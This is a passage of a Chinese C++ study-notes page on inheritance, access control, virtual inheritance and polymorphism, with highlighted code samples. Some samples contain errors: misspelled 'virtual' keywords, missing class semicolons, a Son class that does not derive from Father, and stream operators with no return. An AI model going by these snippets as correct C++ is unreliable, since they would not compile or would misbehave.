class="keyword">int</span> in,<span class="keyword">char</span> cs,<span class="keyword">float</span> fs):Student(sn,in,cs),salary(fs)&#123;&#125;;  <span class="comment">//调用构造器</span></span><br><span class="line">  ~Graduate();</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dump</span><span class="params">()</span></span>&#123;dis();<span class="built_in">cout</span>&lt;&lt;salary&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">float</span> salary;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Doctor</span>:</span><span class="keyword">public</span> Graduate  <span class="comment">//孙子类构造时，只需完成其父类即可，不用完成爷类构造</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  Doctor(<span class="built_in">string</span> sn,<span class="keyword">int</span> in,<span class="keyword">char</span> cs,<span class="keyword">float</span> fs,<span class="built_in">string</span> st):Graduate(sn,in,cs,fs),title(st)&#123;&#125;;  </span><br><span class="line">  ~Doctor();</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;dump();<span class="built_in">cout</span>&lt;&lt;title&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="built_in">string</span> title;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//-----------父类2-------------</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  Father()&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;father&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;  <span class="comment">//无参构造 可以实现子类自动的调用</span></span><br><span class="line">  <span class="comment">//Father(int i=0)&#123;cout&lt;&lt;&quot;father&quot;&lt;&lt;endl;&#125;  // 默认值构造器</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//-----------子类2-------------</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  Son()&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;son&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;  <span class="comment">//首先会隐式的调用父类无参构造，再调用子类构造</span></span><br><span class="line">  <span class="comment">//Son():father()&#123;cout&lt;&lt;&quot;son&quot;&lt;&lt;endl;&#125;  //显示调用父类器构造</span></span><br><span class="line">  <span class="comment">//Son():father(11)&#123;cout&lt;&lt;&quot;son&quot;&lt;&lt;endl;&#125;  //显示调用父类器有参构造</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>派生类构造函数执行的次序：<strong>基类–&gt;成员中的类对象–&gt;子类–&gt;孙类</strong></p><ol><li>调用基类构造函数，调用顺序按照它们被继承时声明的顺序（从左到右）；</li><li>调用内嵌成员对象的构造函数，调用顺序按照它们在类中声明的顺序；</li><li>派生类的构造函数体中的内容</li></ol></li><li><p>子类构造器中，要么显示的调用父类的构造器(传参)，要么隐式的调用。</p></li><li><p>发生隐式调用时，父类要有无参构造器或是可以包含无参构造器的默认参数函数。子类对象亦然。</p></li></ul><h4 id="派生类的拷贝构造"><a class="markdownIt-Anchor" href="#派生类的拷贝构造"></a> 派生类的拷贝构造</h4><ul><li>派生类中的默认拷贝构造器会调用父类中默认或自实现拷贝构造器，若子类中自实现拷贝构造器，则必须显示的调用父类的拷贝构造器。</li><li>格式</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">派生类::派生类(const 派生类&amp; another)</span><br><span class="line">:基类(another),派生类新成员(another.新成员) &#123;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//----------父类----------------</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Student(<span class="built_in">string</span> sn,<span class="keyword">int</span> n,<span class="keyword">char</span> s):name(sn),num(n),sex(s)&#123;&#125;;</span><br><span class="line">Student(<span class="keyword">const</span> Student &amp; another)&#123;name = another.name;num = another.num;sex = another.sex;&#125;;  <span class="comment">//父类拷贝构造器</span></span><br><span class="line">~Student();</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dis</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:<span class="built_in">string</span> name;<span class="keyword">int</span> num;<span class="keyword">char</span> sex;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//----------父类----------------</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Graduate</span>:</span><span class="keyword">public</span> Student&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Graduate(<span class="built_in">string</span> sn,<span class="keyword">int</span> in,<span class="keyword">char</span> cs,<span class="keyword">float</span> fs):Student(sn,in,cs),salary(fs)&#123;&#125;;</span><br><span class="line">~Graduate()&#123;&#125;;</span><br><span class="line">Graduate(<span class="keyword">const</span> Graduate &amp; another):Student(another),salary(another.salary)&#123;&#125;;  <span class="comment">//子类自实现拷贝构造，必须显式调用父类的构造</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dump</span><span class="params">()</span></span>&#123;dis();<span class="built_in">cout</span>&lt;&lt;salary&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line"><span class="keyword">private</span>:<span class="keyword">float</span> salary;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="派生类的赋值运算符重载"><a class="markdownIt-Anchor" href="#派生类的赋值运算符重载"></a> 派生类的赋值运算符重载</h4><ul><li>赋值运算符函数不是构造器，所以可以继承，语法上就没有构造器的严格一些。</li><li>派生类的默认赋值运算符重载函数，会调用父类的默认或自实现函数。派生类若自实现，则不会发生调用行为，也不报错(区别拷贝)，赋值错误，若要正确，需要显式的调用父类的构造器</li><li>格式</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">子类&amp; 子类::<span class="keyword">operator</span>=(<span class="keyword">const</span> 子类&amp; another)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">this</span> == &amp;another)</span><br><span class="line">  <span class="keyword">return</span> *<span class="keyword">this</span>; <span class="comment">//防止自赋值</span></span><br><span class="line">父类::<span class="keyword">operator</span> =(another); <span class="comment">// 调用父类的赋值运算符重载</span></span><br><span class="line"><span class="keyword">this</span>-&gt;salary = another.salary;<span class="comment">//子类成员初始化</span></span><br><span class="line"><span class="keyword">return</span> * <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Graduate &amp; Graduate::<span class="keyword">operator</span>=(<span class="keyword">const</span> Graduate &amp; another)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">this</span> == &amp;another)</span><br><span class="line">  <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">Student::<span class="keyword">operator</span> =(another);   <span class="comment">// 显式的调用父类的赋值运算符函数</span></span><br><span class="line"><span class="keyword">this</span>-&gt;salary = another.salary;</span><br><span class="line"><span class="keyword">return</span> * <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>对于父类和子类的成员重名的方法(即使返回值和参数不同，只要函数名相同)，类似上面的父类的赋值运算函数，则需要使用<code>::</code>到父类的命名空间就可以了。</li></ul><h4 id="派生类友元函数"><a class="markdownIt-Anchor" href="#派生类友元函数"></a> 派生类友元函数</h4><ul><li>由于友元函数并非类成员，因引不能被继承，在某种需求下，可能希望派生类的友元函数能够使用基类中的友元函数。为此可以通过强制类型转换，将派生类的指针或是引用强转为其类的引用或是指针，然后使用转换后的引用或是指针来调用基类中的友元函数。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">friend</span> ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp; out, Student &amp; stu)&#123;out&lt;&lt;stu.a&lt;&lt;<span class="string">&quot;--&quot;</span>&lt;&lt;stu.b&lt;&lt;<span class="built_in">endl</span>;&#125;; </span><br><span class="line"><span class="keyword">private</span>:<span class="keyword">int</span> a;<span class="keyword">int</span> b;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Graduate</span>:</span><span class="keyword">public</span> Student&#123;</span><br><span class="line"><span class="keyword">friend</span> ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp; out, Graduate &amp; gra)&#123;</span><br><span class="line">  out&lt;&lt;(Student&amp;)gra&lt;&lt;<span class="built_in">endl</span>;  <span class="comment">//强转为student，在使用student的&lt;&lt;操作符</span></span><br><span class="line">  out&lt;&lt;gra.c&lt;&lt;<span class="string">&quot;**&quot;</span>&lt;&lt;gra.d&lt;&lt;<span class="built_in">endl</span>; <span class="comment">//调用自身的变量</span></span><br><span class="line">&#125;;  <span class="comment">// 声明友元</span></span><br><span class="line"><span class="keyword">private</span>:<span class="keyword">int</span> c;<span class="keyword">int</span> d;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//-------------------------------</span></span><br><span class="line"><span class="comment">// Student a;</span></span><br><span class="line"><span class="comment">// cout&lt;&lt;a&lt;&lt;endl;</span></span><br><span class="line">Graduate g;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;g&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h4 id="派生类析构函数的语法"><a class="markdownIt-Anchor" href="#派生类析构函数的语法"></a> 派生类析构函数的语法</h4><ul><li>派生类的析构函数的功能是在该对象消亡之前进行一些必要的清理工作，析构函数没有类型，也没有参数。析构函数的执行顺序与构造函数相反。</li><li>析构顺序：<strong>子类-&gt;成员-&gt;基类</strong></li><li>无需指明析构关系。why? 析构函数只有一种，无重载，无默参。</li></ul><h4 id="派生类成员的标识和访问"><a class="markdownIt-Anchor" href="#派生类成员的标识和访问"></a> 派生类成员的标识和访问</h4><h5 id="作用域分辨符"><a class="markdownIt-Anchor" href="#作用域分辨符"></a> 作用域分辨符</h5><ul><li>格式：<code>基类名::成员名；基类名::成员名（参数表）；</code></li><li>如果某派生类的多个基类拥有同名的成员，同时，派生类又新增这样的同名成员，在这种情况下，派生类成员将<code>shadow(隐藏)</code>所有基类的同名成员。这就需要这样的调用方式才能调用基类的同名成员。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">d.Base::func(<span class="number">3</span>); <span class="comment">//访问基类成员</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>重载和隐藏的区别</th><th></th></tr></thead><tbody><tr><td>重载overload</td><td>同一作用域 ，函数同名不同参(个数，类型，顺序)</td></tr><tr><td>隐藏shadow</td><td>父子类中，标识符(函数，变量)相同，无关乎返值和参数(函数)，或声明类 型(变量)</td></tr></tbody></table><h5 id="继承方式"><a class="markdownIt-Anchor" href="#继承方式"></a> 继承方式</h5><ul><li><p>派生类成员属性划分为四种：</p><ol><li>公有成员</li><li>保护成员</li><li>私有成员</li><li>不可见的成员</li></ol></li><li><p>继承方式规定了如何访问基类继承的成员。继承方式有 public, private, protected。继承方式不影响派生类的访问权限，影响了从基类继承来的成员的访问权限，包括派生类内的访问权限和派生类对象。</p></li><li><p>pretected 对于外界访问属性来说，等同于私有，但可以派生类中可见。</p></li></ul><table><thead><tr><th>继承方式</th><th>基类成员方式</th><th>派生类内部访问</th><th>派生类对象访问</th></tr></thead><tbody><tr><td>公有继承</td><td>public<br>protected<br>private</td><td>public<br>protected<br>inaccess</td><td>public<br>inaccess<br>inaccess</td></tr><tr><td>保护继承</td><td>public<br>protected<br>private</td><td>protected<br>protected<br>inaccess</td><td>inaccess<br>inaccess<br>inaccess</td></tr><tr><td>私有继承</td><td>public<br>protected<br>private</td><td>private<br>private<br>inaccess</td><td>inaccess<br>inaccess<br>inaccess</td></tr></tbody></table><ul><li><p>public 公有继承</p><ul><li>当类的继承方式为公有继承时，基类的公有和保护成员的访问属性在派生类中不变，而基类的私有成员不可访问。即基类的公有成员和保护成员被继承到派生类中仍作为派生类的公有成员和保护成员。派生类的其他成员可以直接访问它们。无论派生类的成员还是派生类的对象都无法访问基类的私有成员。</li></ul></li><li><p>private 私有继承</p><ul><li>当类的继承方式为私有继承时，基类中的公有成员和保护成员都以私有成员身份出现在派生类中，而基类的私有成员在派生类中不可访问。基类的公有成员和保护成员被继承后作为派生类的私有成员，派生类的其他成员可以直接访问它们，但是在类外部通过派生类的对象无法访问。无论是派生类的成员还是通过派生类的对象，都无法访问从基类继承的私有成员。通过多次私有继承后，对于基类的成员都会成为不可访问。因此私有继承比较少用。</li></ul></li><li><p>protected 保护继承</p><ul><li>保护继承中，基类的公有成员和私有成员都以保护成员的身份出现在派生类中，而基类的私有成员不可访问。派生类的其他成员可以直接访问从基类继承来的公有和保护成员，但是类外部通过派生类的对象无法访问它们，无论派生类的成员还是派生类的对象，都无法访问基类的私有成员。</li></ul></li><li><p>public作用：传承接口 间接的传承了数据(protected)</p></li><li><p>protected作用：传承数据，间接封杀了对外接口</p></li><li><p>private统杀了数据和接口</p><ol><li>只要是私有成员到派生类中,均不可访问. 正是体现的数据隐蔽性.其私有成员仅可被本类的成员函数访问</li><li>如果多级派生当中，均采用 public,直到最后一级，派生类中均可访问基类的public,protected 成员. 兼顾了数据的隐蔽性和接口传承和数据传递</li><li>如果多级派生当中，均采用 private,直到最后一级,派生类中基类的所有成员均变为不可见. 只兼顾了数据的隐蔽性</li><li>如果多级派生当中,均采用 protected,直到最后一级，派生类的基类的所有成员即使可见,也均不可被类外调用只兼顾了数据的隐蔽性和数据传递</li></ol></li></ul><h3 id="多继承"><a class="markdownIt-Anchor" href="#多继承"></a> 多继承</h3><ul><li>从继承类别上分，继承可分为单继承和多继承，前面讲的都是单继承。</li></ul><h4 id="继承语法"><a class="markdownIt-Anchor" href="#继承语法"></a> 继承语法</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">派生类名::派生类名（参数总表）：基类名 <span class="number">1</span>（参数表 <span class="number">1</span>），基类名（参数名 <span class="number">2</span>）....基类名 n（参数名 n），内嵌子对象 <span class="number">1</span>（参数表 <span class="number">1</span>），内嵌子对象 <span class="number">2</span>（参数表 <span class="number">2</span>）....内嵌子对象 n（参数表 n） &#123;</span><br><span class="line">  派生类新增成员的初始化语句；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="三角问题二义性问题"><a class="markdownIt-Anchor" href="#三角问题二义性问题"></a> 三角问题(二义性问题)</h4><ul><li>多个父类中重名的成员，继承到子类中后，为了避免冲突，携带了各父类的作用域信息, 子类中要访问继承下来的重名成员，则会产生二义性，为了避免冲突，访问时需要还有父类的作用域信息。</li></ul><h4 id="虚继承"><a class="markdownIt-Anchor" href="#虚继承"></a> 虚继承</h4><ul><li>在多继承中，保存共同基类的多份同名成员，虽然有时是必要的，可以在不同的数据成员中分别存放不同的数据，但在大多数情况下，是我们不希望出现的。因为保留多份数据成员的拷贝，不仅占有较多的存储空间，还增加了访问的困难。</li><li>为此，c++提供了，虚基类和虚继承机制，实现了在多继承中只保留一份共同成员。 虚基类，需要设计和抽象，虚继承，是一种继承的扩展。<ol><li>M 类称为虚基类(virtual base class )，是抽象和设计的结果。</li><li>虚继承语法：<code>class 派生类名:virtual 继承方式 基类</code></li><li>虚基类及间接类的实始化</li></ol></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span>A(<span class="keyword">int</span> i)&#123;&#125;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">virtual</span> <span class="keyword">public</span> A &#123;B(<span class="keyword">int</span> n):A(n)&#123;&#125;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span><span class="keyword">virtual</span> <span class="keyword">public</span> A &#123;C(<span class="keyword">int</span> n):A(n)&#123;&#125;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span>:</span><span class="keyword">public</span> B,<span class="keyword">public</span> C &#123;D(<span class="keyword">int</span> n):A(n),B(n),C(n)&#123;&#125;&#125;;  <span class="comment">// 这里ABC都要初始化</span></span><br></pre></td></tr></table></figure><h2 id="多态polymorphism"><a class="markdownIt-Anchor" href="#多态polymorphism"></a> 多态（PolyMorphism）</h2><ul><li>C++中所谓的多态(polymorphism)是指，由继承而产生的相关的不同的类，其对象对同一消息会作出不同的响应。</li><li>多态性是面向对象程序设计的一个重要特征，能增加程序的灵活性。可以减轻系统升级,维 护,调试的工作量和复杂度</li></ul><h3 id="赋值兼容多态实现的前提"><a class="markdownIt-Anchor" href="#赋值兼容多态实现的前提"></a> 赋值兼容(多态实现的前提)</h3><ul><li>子类对象（引用或指针）可以赋值给父类对象（引用和指针），并且是隐式的拷贝，子类的新成员父类无法获取。</li><li>赋值兼容规则是指在需要基类对象的任何地方都可以使用<strong>公有派生类</strong>的对象来替代。赋值兼容是一种默认行为，不需要任何的显示的转化步骤。</li><li>赋值兼容规则中所指的替代包括以下的情况：<ul><li>派生类的对象可以赋值给基类对象。</li><li>派生类的对象可以初始化基类的引用。</li><li>派生类对象的地址可以赋给指向基类的指针。</li><li>只发生在共有派生的父子关系中。</li></ul></li><li>在替代之后，派生类对象就可以作为基类的对象使用，但只能使用从基类继承的成员。</li><li>父类也可以通过强转的方式转化为子类。 父类对象强转为子类对象后，访问从父类继承下来的部分是可以的，但访问子类的部分，则会发生越界的风险，越界的结果是未知的。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  Shape(<span class="keyword">int</span> x,<span class="keyword">int</span> y):_x(x),_y(y)&#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;draw Shap &quot;</span>;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;start (&quot;</span>&lt;&lt;_x&lt;&lt;<span class="string">&quot;,&quot;</span>&lt;&lt;_y&lt;&lt;<span class="string">&quot;) &quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line"><span class="comment">//private:</span></span><br><span class="line"><span class="keyword">protected</span>:<span class="keyword">int</span> _x;<span class="keyword">int</span> _y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span>:</span><span class="keyword">public</span> Shape&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  Circle(<span class="keyword">int</span> x, <span class="keyword">int</span> y,<span class="keyword">int</span> r):Shape(x,y),_r(r)&#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;draw Circle &quot;</span>;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;start (&quot;</span>&lt;&lt;_x&lt;&lt;<span class="string">&quot;,&quot;</span>&lt;&lt;_y&lt;&lt;<span class="string">&quot;) &quot;</span>;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;radio r = &quot;</span>&lt;&lt;_r&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line"><span class="keyword">private</span>:<span class="keyword">int</span> _r;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//------------------------------</span></span><br><span class="line"><span class="function">Shape <span class="title">s</span><span class="params">(<span class="number">3</span>,<span class="number">5</span>)</span></span>;</span><br><span class="line">s.draw();    <span class="comment">//shape的draw方法</span></span><br><span class="line"><span class="function">Circle <span class="title">c</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>)</span></span>;</span><br><span class="line">c.draw();    <span class="comment">//circle的draw覆盖了shape的方法</span></span><br><span class="line">s = c;</span><br><span class="line">s.draw();    <span class="comment">//发生赋值兼容，子类给父类对象，只能访问父类的方法</span></span><br><span class="line">Shape &amp;rs = c;</span><br><span class="line">rs.draw();</span><br><span class="line">Shape *ps = &amp;c;  <span class="comment">//给父类的引用</span></span><br><span class="line">ps-&gt;draw();</span><br><span class="line"><span class="comment">//c = static_cast&lt;Circle&gt;(s); //缺少转化函数</span></span><br><span class="line"><span class="comment">//c.draw();</span></span><br><span class="line">Circle * pc = <span class="keyword">static_cast</span>&lt;Circle*&gt;(&amp;s); <span class="comment">//父类通过强转的方式转化为子类</span></span><br><span class="line">pc-&gt;draw();    <span class="comment">//通过赋值兼容，导致父类接收子类时，强制变为了父类的结构</span></span><br></pre></td></tr></table></figure><h3 id="多态的形成"><a class="markdownIt-Anchor" href="#多态的形成"></a> 多态的形成</h3><h4 id="静多态"><a class="markdownIt-Anchor" href="#静多态"></a> 静多态</h4><ul><li>前面学习的函数重载，也是一种多态现象，通过命名倾轧在编译阶段决定，故称为静多态。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">float</span> b)</span></span>;  <span class="comment">// func_i_f</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">float</span> a,<span class="keyword">int</span> b)</span></span>;  <span class="comment">// func_f_i  在编译时，对同名函数做了区分</span></span><br></pre></td></tr></table></figure><h4 id="动多态"><a class="markdownIt-Anchor" href="#动多态"></a> 动多态</h4><ul><li>动多态是在运行阶段决定，故称为动多态。动多态行成的</li><li>条件如下:<ol><li>父类中有虚函数。</li><li>子类 override(覆写)父类中的虚函数。</li><li>通过己被子类对象赋值的父类指针或引用，调用共用接口。</li></ol></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  Shape(<span class="keyword">int</span> x,<span class="keyword">int</span> y):_x(x),_y(y)&#123;&#125;</span><br><span class="line">  <span class="comment">//1、声明虚函数</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;draw Shap &quot;</span>;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;start (&quot;</span>&lt;&lt;_x&lt;&lt;<span class="string">&quot;,&quot;</span>&lt;&lt;_y&lt;&lt;<span class="string">&quot;) &quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line"><span class="comment">//private:</span></span><br><span class="line"><span class="keyword">protected</span>:<span class="keyword">int</span> _x;<span class="keyword">int</span> _y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span>:</span><span class="keyword">public</span> Shape&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  Circle(<span class="keyword">int</span> x, <span class="keyword">int</span> y,<span class="keyword">int</span> r):Shape(x,y),_r(r)&#123;&#125;</span><br><span class="line">  <span class="comment">//2、子类覆写虚函数，带不带virtual声明都没有关系</span></span><br><span class="line">  <span class="function">virttual <span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;draw Circle &quot;</span>;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;start (&quot;</span>&lt;&lt;_x&lt;&lt;<span class="string">&quot;,&quot;</span>&lt;&lt;_y&lt;&lt;<span class="string">&quot;) &quot;</span>;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;radio r = &quot;</span>&lt;&lt;_r&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line"><span class="keyword">private</span>:<span class="keyword">int</span> _r;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//------------------------------</span></span><br><span class="line"><span class="function">Circle <span class="title">c</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span></span>;</span><br><span class="line">Shape *ps=&amp;c;  <span class="comment">//3、通过己被子类对象赋值的父类指针（或者引用），调用共用接口</span></span><br><span class="line">ps-&gt;draw();   <span class="comment">//此时ps体现的是子类的特性，而不是父类的特性了。</span></span><br></pre></td></tr></table></figure><h3 id="虚函数"><a class="markdownIt-Anchor" href="#虚函数"></a> 虚函数</h3><ol><li>只有类的成员函数才能声明为虚函数<ul><li>虚函数仅适用于有继承关系的类对象，所以普通函数不能声明为虚函数。</li></ul></li><li>静态成员函数不能是虚函数<ul><li>静态成员函数不受对象的捆绑，只有类的信息。</li></ul></li><li>内联函数不能是虚函数</li><li>构造函数不能是虚函数<ul><li>构造时，对象的创建尚未完成。构造完成后，才能算一个名符其实的对象。</li></ul></li><li>析构函数可以是虚函数且通常声明为虚函数。</li></ol><h4 id="虚函数的声明"><a class="markdownIt-Anchor" href="#虚函数的声明"></a> 虚函数的声明</h4><ul><li>格式：<code>class 类名&#123;virtual 函数声明; &#125;</code></li><li>虚函数要点<ol><li>在基类中用 virual 声明成员函数为虚函数。类外实现虚函数时，不必再加 virtual.</li><li>在派生类中重新定义此函数称为覆写，要求函数名，返值类型，函数参数个数及类型全部匹配。并根据派生类的需要重新定义函数体。</li><li>当一个成员函数被声明为虚函数后，其派生类中完全相同的函数（显示的写出）也为虚函数。 可以在其前加 virtual 以示清晰。</li><li>定义一个指基类对象的指针，并使其指向其子类的对象，通过该指针调用虚函数，此时调用的就是指针变量指向对象的同名函数。</li><li>子类中的覆写的函数，可以为任意访问类型，依子类需求决定。</li></ol></li></ul><h4 id="覆写override"><a class="markdownIt-Anchor" href="#覆写override"></a> 覆写override</h4><table><thead><tr><th>重载、隐藏、覆写的区别</th><th></th></tr></thead><tbody><tr><td>重载overload</td><td>同一作用域 ，函数同名不同参(个数，类型，顺序)</td></tr><tr><td>隐藏shadow</td><td>父子类中，标识符(函数，变量)相同，无关乎返值和参数(函数)，或声明类 型(变量)</td></tr><tr><td>覆写override</td><td>父子类中含有virtual声明的同名、同参、同返回的虚函数，子类将其重写</td></tr></tbody></table><h4 id="纯虚函数"><a class="markdownIt-Anchor" href="#纯虚函数"></a> 纯虚函数</h4><ul><li>要点<ol><li>含有纯虚函数的类，称为抽象基类，不可实列化。即不能创建对象，存在的意义就是被继承，提供族类的公共接口，java 中称为 interface。</li><li>纯虚函数只有声明，没有实现，被“初始化”为 0。</li><li>如果一个类中声明了纯虚函数，而在派生类中没有对该函数定义，则该虚函数在派生类中仍然为纯虚函数，派生类仍然为纯虚基类。</li></ol></li><li>格式：<code>class 类名&#123;virtual 函数声明 = 0;&#125;</code> 0只是纯虚函数的格式，没有实现体</li><li>例举</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//------------Shape 类中</span></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="comment">//------------Circle 类中</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;draw Circle &quot;</span>;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;start (&quot;</span>&lt;&lt;_x&lt;&lt;<span class="string">&quot;,&quot;</span>&lt;&lt;_y&lt;&lt;<span class="string">&quot;) &quot;</span>;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;radio r = &quot;</span>&lt;&lt;_r&lt;&lt;<span class="built_in">endl</span>;&#125; </span><br><span class="line"><span class="comment">//------------main()</span></span><br><span class="line"><span class="comment">// Shape s(1,2); //函数纯虚函数的类称为抽象基类</span></span><br><span class="line"><span class="function">Circle <span class="title">c</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span></span>;</span><br><span class="line"><span class="function">Rect <span class="title">r</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>)</span></span>;</span><br><span class="line">Shape *pc = &amp;c;</span><br><span class="line">pc-&gt;draw();</span><br><span class="line">pc = &amp;r;</span><br><span class="line">pc-&gt;draw();</span><br></pre></td></tr></table></figure><h4 id="含有虚函数的析构"><a class="markdownIt-Anchor" href="#含有虚函数的析构"></a> 含有虚函数的析构</h4><ul><li>含有虚函数的类，析构函数也应该声明为虚函数。在 delete 父类指针的时候，会调用子类的析构函数，实现完整析构。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  Shape(<span class="keyword">int</span> x,<span class="keyword">int</span> y):_x(x),_y(y)&#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>= <span class="number">0</span>;  <span class="comment">// 纯虚函数</span></span><br><span class="line">  vitual ~Shape()&#123;&#125;;      <span class="comment">// 虚析构，能够将子类的和自身完整析构。</span></span><br><span class="line"><span class="comment">//private:</span></span><br><span class="line"><span class="keyword">protected</span>:<span class="keyword">int</span> _x;<span class="keyword">int</span> _y;</span><br><span 